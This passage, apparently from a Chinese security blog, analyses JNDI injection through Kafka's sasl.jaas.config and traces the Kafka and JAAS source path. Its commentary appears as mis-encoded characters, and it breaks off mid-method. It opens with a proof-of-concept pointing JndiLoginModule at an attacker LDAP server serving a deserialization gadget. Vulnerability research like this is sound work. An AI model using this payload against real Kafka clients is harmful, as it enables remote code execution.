class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Properties</span> <span class="variable">props</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        props.put(<span class="string">&quot;sasl.mechanism&quot;</span>,<span class="string">&quot;SCRAM-SHA-256&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;security.protocol&quot;</span>,<span class="string">&quot;SASL_SSL&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;sasl.jaas.config&quot;</span>,<span class="string">&quot;com.sun.security.auth.module.JndiLoginModule &quot;</span> +</span><br><span class="line">                <span class="string">&quot;required user.provider.url=\&quot;ldap://192.168.135.132:1389/Deserialization/URLDNS/26ed58ce.ipv6.1433.eu.org\&quot; &quot;</span> +</span><br><span class="line">                <span class="string">&quot;useFirstPass=\&quot;true\&quot; serviceName=\&quot;x\&quot; debug=\&quot;true\&quot; &quot;</span> +</span><br><span class="line">                <span class="string">&quot;group.provider.url=\&quot;xxx\&quot;;&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;123123123:123&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;key.deserializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;value.deserializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;key.serializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;value.serializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            Producer&lt;String, String&gt; producer = <span class="keyword">new</span> <span class="title class_">KafkaProducer</span>&lt;&gt;(props);</span><br><span class="line">            producer.send(<span class="keyword">new</span> <span class="title class_">ProducerRecord</span>&lt;&gt;(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>));</span><br><span class="line">            producer.close();</span><br><span class="line">        &#125;).start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œç»“æœï¼š</p><p><a href="https://pic.imgdb.cn/item/642befd26ea21b9a9e5d97e6.jpg" title="image-20230403193535399" class="gallery-item"><img src="https://pic.imgdb.cn/item/642befd26ea21b9a9e5d97e6.jpg" alt="image-20230403193535399"></a></p><p><a href="https://pic.imgdb.cn/item/642befe46ea21b9a9e5e0c8d.jpg" title="image-20230403193605628" class="gallery-item"><img src="https://pic.imgdb.cn/item/642befe46ea21b9a9e5e0c8d.jpg" alt="image-20230403193605628"></a></p><h2 id="æ¼æ´åˆ†æï¼š"><a href="#æ¼æ´åˆ†æï¼š" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a>æ¼æ´åˆ†æï¼š</h2><p>é¦–å…ˆè·Ÿè¿›org.apache.kafka.clients.producer.KafkaProducer#KafkaProducer(java.util.Properties)ï¼š</p><p><a href="https://pic.imgdb.cn/item/642bf0036ea21b9a9e5e8cb6.jpg" title="image-20230403193729326" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf0036ea21b9a9e5e8cb6.jpg" alt="image-20230403193729326"></a></p><p>è¿™é‡Œè°ƒç”¨äº†org.apache.kafka.clients.producer.KafkaProducer#KafkaProducer(java.util.Properties, org.apache.kafka.common.serialization.Serializer<K>, org.apache.kafka.common.serialization.Serializer<V>)ï¼Œè·Ÿè¿›ä¸€ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/642bf01a6ea21b9a9e5ef1e0.jpg" title="image-20230403193814186" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf01a6ea21b9a9e5ef1e0.jpg" alt="image-20230403193814186"></a></p><p>è¿™é‡Œé¦–å…ˆè°ƒç”¨äº†org.apache.kafka.common.utils.Utils#propsToMapå¯¹ä¼ å…¥çš„Propertiesç±»å‹çš„å¯¹è±¡è¿›è¡Œäº†å¤„ç†ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/642bf0286ea21b9a9e5f336e.jpg" title="image-20230403193922249" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf0286ea21b9a9e5f336e.jpg" alt="image-20230403193922249"></a></p><p>ç”±åå­—å°±å¯ä»¥çœ‹å‡ºæ˜¯å°†Propertiesç±»å‹æ”¹ä¸ºMapç±»å‹ï¼Œå¾—åˆ°çš„ç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><a href="https://pic.imgdb.cn/item/642bf0386ea21b9a9e5f8a2d.jpg" title="image-20230403194046786" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf0386ea21b9a9e5f8a2d.jpg" alt="image-20230403194046786"></a></p><p>æ¥ç€åˆå°†å¾—åˆ°çš„Mapç±»å‹çš„å¯¹è±¡ä¼ å…¥è‡³org.apache.kafka.clients.producer.KafkaProducer#KafkaProducer(java.util.Map&lt;java.lang.String,java.lang.Object&gt;, org.apache.kafka.common.serialization.Serializer<K>, org.apache.kafka.common.serialization.Serializer<V>)ï¼š</p><p><a href="https://pic.imgdb.cn/item/642bf0496ea21b9a9e5fdfc5.jpg" title="image-20230403194137195" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf0496ea21b9a9e5fdfc5.jpg" alt="image-20230403194137195"></a></p><p>è°ƒç”¨äº†org.apache.kafka.clients.producer.ProducerConfig#appendSerializerToConfigï¼š</p><p><a href="https://pic.imgdb.cn/item/642bf0586ea21b9a9e6030d9.jpg" title="image-20230403194218342" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf0586ea21b9a9e6030d9.jpg" alt="image-20230403194218342"></a></p><p>å…¶ä¸­keySerializerå’ŒvalueSerializeréƒ½ä¸ºnullï¼Œå› æ­¤æˆ‘ä»¬åœ¨æœ€å¼€å§‹ä¼ å…¥çš„Propertieså¯¹è±¡ä¸­è®¾ç½®é”®ä¸ºkey.deserializerå’Œvalue.serializerçš„é”®å€¼å¯¹ï¼Œå¦åˆ™ä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸ã€‚æ¥ç€åˆå°†å¾—åˆ°çš„newConfigsä¼ å…¥org.apache.kafka.clients.producer.ProducerConfig#ProducerConfig(java.util.Map&lt;java.lang.String,java.lang.Object&gt;)ï¼š</p><p><a href="https://pic.imgdb.cn/item/642bf0766ea21b9a9e60fb81.jpg" title="image-20230403194447403" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf0766ea21b9a9e60fb81.jpg" alt="image-20230403194447403"></a></p><p>æœ€ç»ˆå¾—åˆ°ä¸€ä¸ªProducerConfigå¯¹è±¡ï¼Œå­—æ®µæƒ…å†µå¦‚ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/642bf0846ea21b9a9e614be8.jpg" title="image-20230403194657285" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf0846ea21b9a9e614be8.jpg" alt="image-20230403194657285"></a></p><p>ä¹‹ååˆå°†è¿™äº›å‚æ•°ä¼ å…¥org.apache.kafka.clients.producer.KafkaProducer#KafkaProducer(org.apache.kafka.clients.producer.ProducerConfig, org.apache.kafka.common.serialization.Serializer<K>, org.apache.kafka.common.serialization.Serializer<V>, org.apache.kafka.clients.producer.internals.ProducerMetadata, org.apache.kafka.clients.KafkaClient, org.apache.kafka.clients.producer.internals.ProducerInterceptors&lt;K,V&gt;, org.apache.kafka.common.utils.Time)ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">KafkaProducer(ProducerConfig config, Serializer&lt;K&gt; keySerializer, Serializer&lt;V&gt; valueSerializer, ProducerMetadata metadata, KafkaClient kafkaClient, ProducerInterceptors&lt;K, V&gt; interceptors, Time time) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.producerConfig = config;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//çœç•¥å¤§é‡ä»£ç </span></span><br><span class="line">            </span><br><span class="line">            <span class="built_in">this</span>.sender = <span class="built_in">this</span>.newSender(logContext, kafkaClient, <span class="built_in">this</span>.metadata);</span><br><span class="line">            <span class="type">String</span> <span class="variable">ioThreadName</span> <span class="operator">=</span> <span class="string">&quot;kafka-producer-network-thread | &quot;</span> + <span class="built_in">this</span>.clientId;</span><br><span class="line">            <span class="built_in">this</span>.ioThread = <span class="keyword">new</span> <span class="title class_">KafkaThread</span>(ioThreadName, <span class="built_in">this</span>.sender, <span class="literal">true</span>);</span><br><span class="line">            <span class="built_in">this</span>.ioThread.start();</span><br><span class="line">            config.logUnused();</span><br><span class="line">            AppInfoParser.registerAppInfo(<span class="string">&quot;kafka.producer&quot;</span>, <span class="built_in">this</span>.clientId, <span class="built_in">this</span>.metrics, time.milliseconds());</span><br><span class="line">            <span class="built_in">this</span>.log.debug(<span class="string">&quot;Kafka producer started&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var24) &#123;</span><br><span class="line">            <span class="built_in">this</span>.close(Duration.ofMillis(<span class="number">0L</span>), <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">KafkaException</span>(<span class="string">&quot;Failed to construct kafka producer&quot;</span>, var24);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯¹this.producerConfigè¿›è¡Œèµ‹å€¼ï¼Œè¿˜è°ƒç”¨äº†org.apache.kafka.clients.producer.KafkaProducer#newSenderæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•ä¸­çš„å‚æ•°å¹¶ä¸é‡è¦ï¼Œç›´æ¥çœ‹ä»£ç ï¼š</p><p><a href="https://pic.imgdb.cn/item/642bf09c6ea21b9a9e61eb36.jpg" title="image-20230403195032610" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf09c6ea21b9a9e61eb36.jpg" alt="image-20230403195032610"></a></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œè°ƒç”¨äº†org.apache.kafka.clients.ClientUtils#createChannelBuilderæ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›ï¼š</p><p><a href="https://pic.imgdb.cn/item/642bf0b46ea21b9a9e627ea3.jpg" title="image-20230403195153310" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf0b46ea21b9a9e627ea3.jpg" alt="image-20230403195153310"></a></p><p>å…¶ä¸­configæ˜¯this.producerConfigï¼Œè¿™é‡Œä»configä¸­è·å–åˆ°security.protocolä»¥åŠsasl.mechanismæ‰€å¯¹åº”çš„å€¼å¹¶èµ‹å€¼ç»™ç›¸åº”çš„å˜é‡ï¼Œå…¶ä¸­securityProtocolï¼š</p><p><a href="https://pic.imgdb.cn/item/642bf0c46ea21b9a9e62c511.jpg" title="image-20230403195334222" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf0c46ea21b9a9e62c511.jpg" alt="image-20230403195334222"></a></p><p>ä¹‹ååˆè°ƒç”¨äº†org.apache.kafka.common.network.ChannelBuilders#clientChannelBuilderï¼š</p><p><a href="https://pic.imgdb.cn/item/642bf0d26ea21b9a9e630c61.jpg" title="image-20230403195429074" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf0d26ea21b9a9e630c61.jpg" alt="image-20230403195429074"></a></p><p>è¿™é‡Œåˆ¤æ–­securityProtocolæ˜¯å¦æ˜¯SASL_PLAINTEXTæˆ–SASL_SSLï¼Œå¦‚æœæ˜¯åˆ™è¿›å…¥åˆ¤æ–­ã€‚ä¹‹ååˆ¤æ–­contextTypeæ˜¯å¦ä¸ºç©ºï¼Œè¿™ä¸ªå€¼ä¸ä¸ºnullï¼ŒclientSaslMechanismçš„å€¼å°±æ˜¯sasl.mechanismå¯¹åº”çš„å€¼ï¼Œä¹Ÿå°±æ˜¯POCä¸­çš„SCRAM-SHA-256ï¼š</p><p><a href="https://pic.imgdb.cn/item/642bf0e46ea21b9a9e635c6e.jpg" title="image-20230403195729717" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf0e46ea21b9a9e635c6e.jpg" alt="image-20230403195729717"></a></p><p>å› æ­¤sasl.mechanismçš„å€¼æ˜¯å¿…é¡»å­˜åœ¨çš„ï¼Œå¦åˆ™å°†æŠ›å‡ºå¼‚å¸¸ã€‚ä¹‹ååˆè°ƒç”¨äº†org.apache.kafka.common.network.ChannelBuilders#createï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ChannelBuilder <span class="title function_">create</span><span class="params">(SecurityProtocol securityProtocol, Mode mode, JaasContext.Type contextType, AbstractConfig config, ListenerName listenerName, <span class="type">boolean</span> isInterBrokerListener, String clientSaslMechanism, <span class="type">boolean</span> saslHandshakeRequestEnable, CredentialCache credentialCache, DelegationTokenCache tokenCache, Time time, LogContext logContext, Supplier&lt;ApiVersionsResponse&gt; apiVersionSupplier)</span> &#123;</span><br><span class="line">        Map&lt;String, Object&gt; configs = channelBuilderConfigs(config, listenerName);</span><br><span class="line">        Object channelBuilder;</span><br><span class="line">        <span class="keyword">switch</span> (securityProtocol) &#123;</span><br><span class="line">            <span class="keyword">case</span> SSL:</span><br><span class="line">                requireNonNullMode(mode, securityProtocol);</span><br><span class="line">                channelBuilder = <span class="keyword">new</span> <span class="title class_">SslChannelBuilder</span>(mode, listenerName, isInterBrokerListener, logContext);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> SASL_SSL:</span><br><span class="line">            <span class="keyword">case</span> SASL_PLAINTEXT:</span><br><span class="line">                requireNonNullMode(mode, securityProtocol);</span><br><span class="line">                <span class="type">String</span> <span class="variable">sslClientAuthOverride</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                Object jaasContexts;</span><br><span class="line">                <span class="keyword">if</span> (mode != Mode.SERVER) &#123;</span><br><span class="line">                    <span class="type">JaasContext</span> <span class="variable">jaasContext</span> <span class="operator">=</span> contextType == Type.CLIENT ? JaasContext.loadClientContext(configs) : JaasContext.loadServerContext(listenerName, clientSaslMechanism, configs);</span><br><span class="line">                    jaasContexts = Collections.singletonMap(clientSaslMechanism, jaasContext);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    List&lt;String&gt; enabledMechanisms = (List)configs.get(<span class="string">&quot;sasl.enabled.mechanisms&quot;</span>);</span><br><span class="line">                    jaasContexts = <span class="keyword">new</span> <span class="title class_">HashMap</span>(enabledMechanisms.size());</span><br><span class="line">                    <span class="type">Iterator</span> <span class="variable">var18</span> <span class="operator">=</span> enabledMechanisms.iterator();</span><br><span class="line"></span><br><span class="line">                    String listenerClientAuth;</span><br><span class="line">                    <span class="keyword">while</span>(var18.hasNext()) &#123;</span><br><span class="line">                        listenerClientAuth = (String)var18.next();</span><br><span class="line">                        ((Map)jaasContexts).put(listenerClientAuth, JaasContext.loadServerContext(listenerName, listenerClientAuth, configs));</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (listenerName != <span class="literal">null</span> &amp;&amp; securityProtocol == SecurityProtocol.SASL_SSL) &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">configuredClientAuth</span> <span class="operator">=</span> (String)configs.get(<span class="string">&quot;ssl.client.auth&quot;</span>);</span><br><span class="line">                        listenerClientAuth = (String)config.originalsWithPrefix(listenerName.configPrefix(), <span class="literal">true</span>).get(<span class="string">&quot;ssl.client.auth&quot;</span>);</span><br><span class="line">                        <span class="keyword">if</span> (listenerClientAuth == <span class="literal">null</span>) &#123;</span><br><span class="line">                            sslClientAuthOverride = SslClientAuth.NONE.name().toLowerCase(Locale.ROOT);</span><br><span class="line">                            <span class="keyword">if</span> (configuredClientAuth != <span class="literal">null</span> &amp;&amp; !configuredClientAuth.equalsIgnoreCase(SslClientAuth.NONE.name())) &#123;</span><br><span class="line">                                log.warn(<span class="string">&quot;Broker configuration &#x27;&#123;&#125;&#x27; is applied only to SSL listeners. Listener-prefixed configuration can be used to enable SSL client authentication for SASL_SSL listeners. In future releases, broker-wide option without listener prefix may be applied to SASL_SSL listeners as well. All configuration options intended for specific listeners should be listener-prefixed.&quot;</span>, <span class="string">&quot;ssl.client.auth&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                channelBuilder = <span class="keyword">new</span> <span class="title class_">SaslChannelBuilder</span>(mode, (Map)jaasContexts, securityProtocol, listenerName, isInterBrokerListener, clientSaslMechanism, saslHandshakeRequestEnable, credentialCache, tokenCache, sslClientAuthOverride, time, logContext, apiVersionSupplier);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> PLAINTEXT:</span><br><span class="line">                channelBuilder = <span class="keyword">new</span> <span class="title class_">PlaintextChannelBuilder</span>(listenerName);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Unexpected securityProtocol &quot;</span> + securityProtocol);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ((ChannelBuilder)channelBuilder).configure(configs);</span><br><span class="line">        <span class="keyword">return</span> (ChannelBuilder)channelBuilder;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆå¾—åˆ°ä¸€ä¸ªMapç±»å‹çš„å¯¹è±¡configsï¼Œéƒ¨åˆ†é”®å€¼å¯¹æ˜¯æˆ‘ä»¬åœ¨POCä¸­è®¾ç½®å¥½çš„ã€‚ä¹‹åè¿›è¡Œswitchè¯­å¥ï¼Œè‹¥securityProtocolä¸ºSASL_SSLæˆ–SASL_PLAINTEXTï¼Œå°±ä¼šæ‰§è¡Œå¦‚ä¸‹ä¸€è¡Œä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">channelBuilder = <span class="keyword">new</span> <span class="title class_">SaslChannelBuilder</span>(mode, (Map)jaasContexts, securityProtocol, listenerName, isInterBrokerListener, clientSaslMechanism, saslHandshakeRequestEnable, credentialCache, tokenCache, sslClientAuthOverride, time, logContext, apiVersionSupplier);</span><br></pre></td></tr></table></figure><p>å› æ­¤channelBuilderæ˜¯ä¸€ä¸ªSaslChannelBuilderç±»å‹çš„å¯¹è±¡ï¼Œä¹‹åé€€å‡ºswitchè¯­å¥ï¼Œè°ƒç”¨äº†channelBuilderçš„configureæ–¹æ³•ï¼Œå‚æ•°ä¸ºconfigsã€‚è·Ÿè¿›ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configure</span><span class="params">(Map&lt;String, ?&gt; configs)</span> <span class="keyword">throws</span> KafkaException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.configs = configs;</span><br><span class="line">            </span><br><span class="line">            ......</span><br><span class="line"></span><br><span class="line">            <span class="type">Iterator</span> <span class="variable">var12</span> <span class="operator">=</span> <span class="built_in">this</span>.jaasContexts.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(var12.hasNext()) &#123;</span><br><span class="line">                Map.Entry&lt;String, JaasContext&gt; entry = (Map.Entry)var12.next();</span><br><span class="line">                <span class="type">String</span> <span class="variable">mechanism</span> <span class="operator">=</span> (String)entry.getKey();</span><br><span class="line">                <span class="type">LoginManager</span> <span class="variable">loginManager</span> <span class="operator">=</span> LoginManager.acquireLoginManager((JaasContext)entry.getValue(), mechanism, defaultLoginClass, configs);</span><br><span class="line">                <span class="built_in">this</span>.loginManagers.put(mechanism, loginManager);</span><br><span class="line">                <span class="type">Subject</span> <span class="variable">subject</span> <span class="operator">=</span> loginManager.subject();</span><br><span class="line">                <span class="built_in">this</span>.subjects.put(mechanism, subject);</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.mode == Mode.SERVER &amp;&amp; mechanism.equals(<span class="string">&quot;GSSAPI&quot;</span>)) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.maybeAddNativeGssapiCredentials(subject);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.securityProtocol == SecurityProtocol.SASL_SSL) &#123;</span><br><span class="line">                <span class="built_in">this</span>.sslFactory = <span class="keyword">new</span> <span class="title class_">SslFactory</span>(<span class="built_in">this</span>.mode, <span class="built_in">this</span>.sslClientAuthOverride, <span class="built_in">this</span>.isInterBrokerListener);</span><br><span class="line">                <span class="built_in">this</span>.sslFactory.configure(configs);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var9) &#123;</span><br><span class="line">            <span class="built_in">this</span>.close();</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">KafkaException</span>(var9);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­this.jaasContextsï¼š</p><p><a href="https://pic.imgdb.cn/item/642bf0fa6ea21b9a9e63e032.jpg" title="image-20230403200819510" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf0fa6ea21b9a9e63e032.jpg" alt="image-20230403200819510"></a></p><p>è¿›å…¥whileå¾ªç¯ï¼Œæ‰§è¡Œå¦‚ä¸‹ä¸€è¡Œä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">LoginManager</span> <span class="variable">loginManager</span> <span class="operator">=</span> LoginManager.acquireLoginManager((JaasContext)entry.getValue(), mechanism, defaultLoginClass, configs);</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›org.apache.kafka.common.security.authenticator.LoginManager#acquireLoginManagerï¼š</p><p><a href="https://pic.imgdb.cn/item/642bf1086ea21b9a9e6424b0.jpg" title="image-20230403201144766" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf1086ea21b9a9e6424b0.jpg" alt="image-20230403201144766"></a></p><p>å…¶ä¸­jaasConfigValueçš„valueå­—æ®µä¸ºPOCä¸­sasl.jaas.configçš„å€¼ã€‚loginManagerä¸ºnullï¼Œè°ƒç”¨org.apache.kafka.common.security.authenticator.LoginManager#LoginManagerï¼š</p><p><a href="https://pic.imgdb.cn/item/642bf1146ea21b9a9e646dc1.jpg" title="image-20230403201458983" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf1146ea21b9a9e646dc1.jpg" alt="image-20230403201458983"></a></p><p>å…¶ä¸­loginMetadataçš„loginClasså­—æ®µä¸ºï¼š</p><p><a href="https://pic.imgdb.cn/item/642bf1246ea21b9a9e64d17e.jpg" title="image-20230403201544460" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf1246ea21b9a9e64d17e.jpg" alt="image-20230403201544460"></a></p><p>å› æ­¤this.loginæ˜¯ä¸€ä¸ªorg.apache.kafka.common.security.authenticator.DefaultLoginå®ä¾‹ã€‚ä¹‹ååˆè°ƒç”¨äº†<code>this.login.login()</code>ï¼Œè·Ÿè¿›org.apache.kafka.common.security.authenticator.AbstractLogin#loginï¼š</p><p><a href="https://pic.imgdb.cn/item/642bf1326ea21b9a9e65295f.jpg" title="image-20230403201712476" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf1326ea21b9a9e65295f.jpg" alt="image-20230403201712476"></a></p><p>åˆè°ƒç”¨äº†javax.security.auth.login.LoginContext#loginï¼š</p><p><a href="https://pic.imgdb.cn/item/642bf1496ea21b9a9e65a283.jpg" title="image-20230403201751765" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf1496ea21b9a9e65a283.jpg" alt="image-20230403201751765"></a></p><p>è°ƒç”¨äº†javax.security.auth.login.LoginContext#invokePrivï¼Œå¹¶ä¼ å…¥äº†LOGIN_METHODï¼Œå®ƒçš„å€¼æ˜¯â€loginâ€ï¼š</p><p><a href="https://pic.imgdb.cn/item/642bf1586ea21b9a9e65ee78.jpg" title="image-20230403201905949" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf1586ea21b9a9e65ee78.jpg" alt="image-20230403201905949"></a></p><p>javax.security.auth.login.LoginContext#invokePrivéƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(String methodName)</span> <span class="keyword">throws</span> LoginException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// start at moduleIndex</span></span><br><span class="line">        <span class="comment">// - this can only be non-zero if methodName is LOGIN_METHOD</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> moduleIndex; i &lt; moduleStack.length; i++, moduleIndex++) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="type">int</span> <span class="variable">mIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">               